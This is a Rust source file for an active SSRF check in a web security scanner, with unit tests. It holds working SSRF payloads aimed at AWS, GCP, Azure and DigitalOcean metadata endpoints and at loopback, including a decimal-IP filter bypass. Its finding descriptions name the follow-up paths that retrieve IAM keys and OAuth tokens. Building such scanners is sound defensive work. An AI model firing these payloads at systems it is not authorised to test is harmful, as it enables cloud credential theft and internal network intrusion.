//! Server-Side Request Forgery — SSRF (A10 / A05 depending on variant).
//!
//! For every URL-shaped query parameter we substitute a small set of
//! high-signal targets — cloud-metadata endpoints (AWS IMDSv1, GCP,
//! Azure, DigitalOcean) plus localhost / loopback variants — and
//! inspect the response for fingerprints that can only have come from
//! the server having actually issued the request.
//!
//! Without an out-of-band (OOB) interaction server we can't catch
//! every SSRF — blind variants where the server makes the request but
//! never reflects the result will stay silent until the active Nuclei
//! engine lands with an Interactsh-equivalent. What we can confirm
//! *today* is the much more dangerous subset: metadata-leak SSRFs
//! that expose IAM credentials, and localhost-probing SSRFs that
//! reveal internal admin surfaces.
//!
//! The check is deliberately conservative — it requires a distinctive
//! marker in the response body, not just "response changed". A diff
//! oracle would light up on every well-behaved URL-validator that
//! returns a different error for blocked targets.

use async_trait::async_trait;
use corvex_proxy::Exchange;
use serde_json::json;

use crate::active::with_param_value;
use crate::check::{ActiveCheck, CheckCtx, CheckDescriptor, CheckKind, OwaspCategory};
use crate::finding::{Finding, Severity};

pub struct Ssrf;

/// One probe payload + the markers that confirm a hit.
#[derive(Debug, Clone, Copy)]
struct SsrfProbe {
    /// Short label shown in evidence so the user can tell which variant
    /// fired ("aws-imds", "gcp-meta", "loopback-ipv4", ...).
    label: &'static str,
    /// The URL we substitute into the parameter.
    payload: &'static str,
    /// Response-body markers (case-insensitive substring match). A
    /// single match confirms the SSRF.
    markers: &'static [&'static str],
    /// Severity to assign when markers match. Metadata leaks are
    /// Critical; loopback probes are High (they prove SSRF but may or
    /// may not leak sensitive data).
    severity: Severity,
    /// OWASP category code for this variant.
    category: &'static str,
    /// Human-readable explanation emitted with the finding.
    description: &'static str,
}

/// Cloud metadata probes — each of these URLs only responds from
/// inside the cloud instance itself. If their body text comes back via
/// the target app, the app fetched them on our behalf.
const METADATA_PROBES: &[SsrfProbe] = &[
    SsrfProbe {
        label: "aws-imds",
        payload: "http://169.254.169.254/latest/meta-data/",
        markers: &[
            "ami-id",
            "instance-id",
            "security-credentials",
            "iam/",
            "public-keys/",
        ],
        severity: Severity::Critical,
        category: "A10",
        description:
            "The application fetched AWS EC2 instance metadata on our behalf and returned \
             the response. This is full-confirm SSRF with IAM-credential-exfiltration \
             reach — the attacker can follow up with /latest/meta-data/iam/security-credentials/<role> \
             to retrieve temporary AWS access keys.",
    },
    SsrfProbe {
        label: "aws-imds-creds",
        payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        markers: &["AccessKeyId", "SecretAccessKey", "Token", "Expiration"],
        severity: Severity::Critical,
        category: "A10",
        description:
            "The application reflected AWS IAM security credentials. Temporary access \
             keys are usable against the full AWS API surface the instance role was \
             granted — treat this as a live credential leak.",
    },
    SsrfProbe {
        label: "gcp-meta",
        payload: "http://metadata.google.internal/computeMetadata/v1/",
        markers: &["computeMetadata", "/project", "instance/", "service-accounts"],
        severity: Severity::Critical,
        category: "A10",
        description:
            "The application fetched GCP compute metadata on our behalf. Follow-up with \
             /computeMetadata/v1/instance/service-accounts/default/token exposes an \
             OAuth access token for the instance's default service account.",
    },
    SsrfProbe {
        label: "azure-meta",
        payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        markers: &["compute", "subscriptionId", "resourceGroupName", "location"],
        severity: Severity::Critical,
        category: "A10",
        description:
            "The application fetched Azure IMDS instance metadata. Follow-up with \
             /metadata/identity/oauth2/token exposes managed-identity OAuth tokens.",
    },
    SsrfProbe {
        label: "digitalocean-meta",
        payload: "http://169.254.169.254/metadata/v1/",
        markers: &["droplet_id", "hostname", "user-data", "dns/nameservers"],
        severity: Severity::High,
        category: "A10",
        description:
            "The application fetched DigitalOcean droplet metadata on our behalf. Less \
             immediately dangerous than AWS/GCP/Azure (no temporary credentials by \
             default) but still exposes internal topology.",
    },
];

/// Loopback probes — only confirm when the response body carries a
/// marker that couldn't have come from a public origin (SSH banners,
/// Apache / nginx default index pages, "Connection refused" errors
/// proxied back with an internal IP in the message). We specifically
/// do NOT flag on "response differs from baseline" alone.
const LOOPBACK_PROBES: &[SsrfProbe] = &[
    SsrfProbe {
        label: "loopback-ipv4",
        payload: "http://127.0.0.1/",
        markers: &[
            // Leaked error messages pointing at localhost
            "127.0.0.1",
            "Connection refused",
            "ECONNREFUSED",
            // Default server landing pages often include these
            "Welcome to nginx",
            "It works!",
            "Apache/",
            "Test Page for the",
        ],
        severity: Severity::High,
        category: "A10",
        description:
            "The application fetched http://127.0.0.1/ on our behalf and reflected the \
             response. An attacker can pivot to every internal HTTP service listening on \
             loopback — admin panels, debug endpoints, unauthenticated management APIs.",
    },
    SsrfProbe {
        label: "loopback-ipv4-int",
        payload: "http://2130706433/",
        markers: &[
            "127.0.0.1",
            "Connection refused",
            "Welcome to nginx",
            "It works!",
            "Apache/",
        ],
        severity: Severity::High,
        category: "A10",
        description:
            "SSRF filter bypass via decimal-IP notation (2130706433 = 127.0.0.1). \
             Servers that block the string '127.0.0.1' often let this form through.",
    },
    SsrfProbe {
        label: "localhost",
        payload: "http://localhost/",
        markers: &[
            "localhost",
            "Welcome to nginx",
            "It works!",
            "Apache/",
            "Connection refused",
        ],
        severity: Severity::High,
        category: "A10",
        description:
            "The application fetched http://localhost/ and reflected the response.",
    },
];

#[async_trait]
impl ActiveCheck for Ssrf {
    fn descriptor(&self) -> CheckDescriptor {
        CheckDescriptor {
            id: "ssrf".into(),
            name: "Server-Side Request Forgery (SSRF)".into(),
            category: OwaspCategory::new("A10"),
            kind: CheckKind::Active,
            default_severity: Severity::High,
            description: "Substitutes cloud-metadata and loopback URLs into URL-shaped query \
                 parameters and confirms SSRF by matching distinctive markers in the \
                 response body (AWS IAM keys, GCP service tokens, server default \
                 pages, connection-refused errors). Marker-based detection only — \
                 blind SSRF needs the active-Nuclei engine or an OOB server."
                .to_string(),
        }
    }

    async fn run(&self, ctx: &CheckCtx, target: &Exchange) -> Vec<Finding> {
        // Baseline body — used to suppress findings when the marker
        // was already present in the unmodified response (some
        // homepages literally contain the word "Apache" in a footer).
        let baseline_body = match ctx.send_with_csrf(&target.request).await {
            Ok(r) => r.body_str().into_owned(),
            Err(_) => String::new(),
        };

        let mut findings = Vec::new();
        let mut param_fired: std::collections::HashSet<(String, &'static str)> =
            std::collections::HashSet::new();

        for probe in METADATA_PROBES.iter().chain(LOOPBACK_PROBES.iter()) {
            let mutations = with_param_value(&target.request, |_, _| probe.payload.to_string());
            for (name, original, mutated) in mutations {
                // Only try URL-shaped values — same heuristic as
                // open-redirect. A numeric id parameter is never
                // SSRF-relevant.
                if !looks_url_shaped(&original) {
                    continue;
                }
                // One finding per (param, probe) — the baseline check
                // below means we won't duplicate anyway, but the guard
                // is cheap and protects against racy re-entry.
                if !param_fired.insert((name.clone(), probe.label)) {
                    continue;
                }

                let Ok(resp) = ctx.send_with_csrf(&mutated).await else {
                    continue;
                };
                let body = resp.body_str();
                let body_lower = body.to_ascii_lowercase();
                let baseline_lower = baseline_body.to_ascii_lowercase();
                let payload_lower = probe.payload.to_ascii_lowercase();

                // Require at least one marker that wasn't already in
                // the baseline. Case-insensitive on both sides.
                let matched: Vec<&str> = probe
                    .markers
                    .iter()
                    .filter(|m| {
                        let needle = m.to_ascii_lowercase();
                        // Skip markers that are substrings of the probe's own
                        // payload (e.g. `127.0.0.1` in `http://127.0.0.1/`):
                        // those are satisfied merely by the app echoing the
                        // injected URL back in an error page, which is NOT
                        // proof it actually fetched the loopback target.
                        if payload_lower.contains(&needle) {
                            return false;
                        }
                        body_lower.contains(&needle) && !baseline_lower.contains(&needle)
                    })
                    .copied()
                    .collect();
                if matched.is_empty() {
                    continue;
                }

                findings.push(
                    Finding::new(
                        "ssrf",
                        target.id,
                        probe.severity,
                        format!("SSRF in `{name}` — {label}", label = probe.label),
                    )
                    .with_description(probe.description.to_string())
                    .with_evidence(json!({
                        "param": name,
                        "original_value": original,
                        "probe": probe.label,
                        "payload": probe.payload,
                        "category": probe.category,
                        "matched_markers": matched,
                        "response_status": resp.status,
                        "baseline_len": baseline_body.len(),
                        "probe_response_len": body.len(),
                    })),
                );
            }
        }

        findings
    }
}

/// URL-shape heuristic — mirrors the one in `open_redirect` but
/// operates on the already-decoded parameter value rather than the URI
/// string. A bare numeric id or a boolean flag is never SSRF-relevant;
/// inspecting every param would waste a baseline-plus-8 request
/// budget on parameters that can't carry a URL.
fn looks_url_shaped(value: &str) -> bool {
    if value.is_empty() {
        return false;
    }
    let trimmed = value.trim();
    trimmed.starts_with("http://")
        || trimmed.starts_with("https://")
        || trimmed.starts_with("//")
        || trimmed.starts_with('/')
        || trimmed.starts_with("file:")
        || trimmed.starts_with("ftp://")
        || trimmed.contains("://")
        || trimmed.contains(".com")
        || trimmed.contains(".net")
        || trimmed.contains(".org")
        || trimmed.contains(".io")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn url_shape_accepts_common_url_forms() {
        assert!(looks_url_shaped("https://example.com/path"));
        assert!(looks_url_shaped("//example.com/"));
        assert!(looks_url_shaped("/api/proxy?u=bar"));
        assert!(looks_url_shaped("http://127.0.0.1/"));
        assert!(looks_url_shaped("  https://example.com  ")); // surrounding whitespace
        assert!(looks_url_shaped("example.com/foo")); // tld-only, still URL-ish
    }

    #[test]
    fn url_shape_rejects_obviously_non_url_values() {
        assert!(!looks_url_shaped(""));
        assert!(!looks_url_shaped("42"));
        assert!(!looks_url_shaped("true"));
        assert!(!looks_url_shaped("alice"));
        assert!(!looks_url_shaped("status:open"));
    }

    #[test]
    fn descriptor_carries_ssrf_metadata() {
        let d = Ssrf.descriptor();
        assert_eq!(d.id, "ssrf");
        assert_eq!(d.kind, CheckKind::Active);
        assert_eq!(d.category.code(), "A10");
    }

    #[test]
    fn probe_catalogue_has_cloud_and_loopback_entries() {
        let labels: Vec<&str> = METADATA_PROBES
            .iter()
            .chain(LOOPBACK_PROBES.iter())
            .map(|p| p.label)
            .collect();
        for must in ["aws-imds", "gcp-meta", "azure-meta", "loopback-ipv4", "localhost"] {
            assert!(
                labels.contains(&must),
                "missing probe `{must}` in catalogue: {labels:?}"
            );
        }
    }

    #[test]
    fn critical_severity_on_metadata_probes() {
        for p in METADATA_PROBES {
            // Every metadata probe should be at least High (the
            // DigitalOcean one is High; AWS/GCP/Azure are Critical).
            assert!(
                matches!(p.severity, Severity::High | Severity::Critical),
                "metadata probe {} should not be below High, got {:?}",
                p.label,
                p.severity,
            );
        }
    }
}
